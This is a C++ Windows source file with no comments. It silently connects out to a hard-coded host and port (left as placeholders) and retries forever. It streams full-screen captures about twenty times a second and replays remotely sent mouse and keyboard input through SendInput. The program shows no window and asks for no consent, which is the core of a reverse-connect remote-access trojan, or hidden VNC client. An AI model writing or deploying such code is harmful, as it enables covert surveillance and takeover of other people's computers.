#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

#define FPS_MS   50
#define RECONNECT_MS 15000

static char g_host[256] = "??";
static int g_port = ??;

static SOCKET g_sock = INVALID_SOCKET;

static int send_all(SOCKET s, const void *buf, int len) {
    const char *p = (const char *)buf;
    int off = 0;
    while (off < len) {
        int n = send(s, p + off, len - off, 0);
        if (n <= 0) return -1;
        off += n;
    }
    return 0;
}

static int recv_all(SOCKET s, void *buf, int len) {
    char *p = (char *)buf;
    int off = 0;
    while (off < len) {
        int n = recv(s, p + off, len - off, 0);
        if (n <= 0) return -1;
        off += n;
    }
    return 0;
}

static SOCKET connect_to(const char *host, int port) {
    struct addrinfo hints, *res = NULL, *p;
    char ps[16];
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    snprintf(ps, sizeof ps, "%d", port);
    if (getaddrinfo(host, ps, &hints, &res) != 0) return INVALID_SOCKET;
    SOCKET s = INVALID_SOCKET;
    for (p = res; p; p = p->ai_next) {
        s = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (s == INVALID_SOCKET) continue;
        if (connect(s, p->ai_addr, (int)p->ai_addrlen) == 0) break;
        closesocket(s); s = INVALID_SOCKET;
    }
    freeaddrinfo(res);
    return s;
}

static void apply_input(const BYTE *p, int n) {
    if (n < 1) return;
    BYTE type = p[0];
    INPUT in;
    memset(&in, 0, sizeof in);

    switch (type) {
    case 0x01: {
        if (n < 5) return;
        int16_t x, y; memcpy(&x, p + 1, 2); memcpy(&y, p + 3, 2);
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        in.type = INPUT_MOUSE;
        in.mi.dx = (LONG)((double)x * 65535.0 / (sw > 1 ? sw - 1 : 1));
        in.mi.dy = (LONG)((double)y * 65535.0 / (sh > 1 ? sh - 1 : 1));
        in.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
        SendInput(1, &in, sizeof in);
        break;
    }
    case 0x02: {
        if (n < 3) return;
        BYTE btn = p[1], down = p[2];
        DWORD flag = 0;
        if (btn == 0) flag = down ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP;
        else if (btn == 1) flag = down ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP;
        else flag = down ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
        in.type = INPUT_MOUSE;
        in.mi.dwFlags = flag;
        SendInput(1, &in, sizeof in);
        break;
    }
    case 0x03: {
        if (n < 3) return;
        int16_t d; memcpy(&d, p + 1, 2);
        in.type = INPUT_MOUSE;
        in.mi.mouseData = (DWORD)d;
        in.mi.dwFlags = MOUSEEVENTF_WHEEL;
        SendInput(1, &in, sizeof in);
        break;
    }
    case 0x04: {
        if (n < 4) return;
        uint16_t vk; BYTE down;
        memcpy(&vk, p + 1, 2); down = p[3];
        in.type = INPUT_KEYBOARD;
        in.ki.wVk = (WORD)vk;
        in.ki.dwFlags = down ? 0 : KEYEVENTF_KEYUP;
        SendInput(1, &in, sizeof in);
        break;
    }
    }
}

static int send_screen_bmp(SOCKET s, HDC screen_dc, int w, int h) {
    HDC mem = CreateCompatibleDC(screen_dc);
    HBITMAP bmp = CreateCompatibleBitmap(screen_dc, w, h);
    HGDIOBJ old = SelectObject(mem, bmp);
    int result = 0;

    if (!BitBlt(mem, 0, 0, w, h, screen_dc, 0, 0, SRCCOPY | CAPTUREBLT)) {
        result = -1;
        goto cleanup;
    }

    BITMAPINFO bi;
    memset(&bi, 0, sizeof bi);
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;
    
    size_t image_size = (size_t)w * h * 4;
    size_t file_size = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + image_size;

    BYTE *buf = (BYTE *)malloc(file_size);
    if (!buf) { result = -1; goto cleanup; }

    BITMAPFILEHEADER *bfh = (BITMAPFILEHEADER *)buf;
    bfh->bfType = 0x4D42;
    bfh->bfSize = (DWORD)file_size;
    bfh->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    
    memcpy(buf + sizeof(BITMAPFILEHEADER), &bi.bmiHeader, sizeof(BITMAPINFOHEADER));
    
    if (GetDIBits(screen_dc, bmp, 0, h, buf + bfh->bfOffBits, &bi, DIB_RGB_COLORS) == 0) {
        free(buf);
        result = -1;
        goto cleanup;
    }

    uint32_t len_le = (uint32_t)file_size;
    if (send_all(s, &len_le, 4) != 0 || send_all(s, buf, (int)file_size) != 0) {
        result = -1;
    }
    free(buf);

cleanup:
    SelectObject(mem, old);
    DeleteObject(bmp);
    DeleteDC(mem);
    return result;
}

static void run_session(SOCKET s) {
    HDC screen_dc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    ULONGLONG last_frame = 0;

    for (;;) {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(s, &fds);
        struct timeval tv = { 0, 5000 };
        int sel = select(0, &fds, NULL, NULL, &tv);
        if (sel < 0) break;
        
        if (sel > 0 && FD_ISSET(s, &fds)) {
            BYTE type = 0;
            if (recv_all(s, &type, 1) != 0) break;
            BYTE payload[8] = { 0 };
            payload[0] = type;
            int want = 0;
            switch (type) {
            case 0x01: want = 4; break;
            case 0x02: want = 2; break;
            case 0x03: want = 2; break;
            case 0x04: want = 3; break;
            default: continue;
            }
            if (recv_all(s, payload + 1, want) != 0) break;
            apply_input(payload, 1 + want);
        }

        ULONGLONG now = GetTickCount64();
        if (now - last_frame >= FPS_MS) {
            last_frame = now;
            if (send_screen_bmp(s, screen_dc, w, h) != 0) break;
        }
    }

    ReleaseDC(NULL, screen_dc);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    for (;;) {
        g_sock = connect_to(g_host, g_port);
        if (g_sock == INVALID_SOCKET) { Sleep(5000); continue; }
        run_session(g_sock);
        closesocket(g_sock);
        g_sock = INVALID_SOCKET;
        Sleep(RECONNECT_MS);
    }

    WSACleanup();
    return 0;
}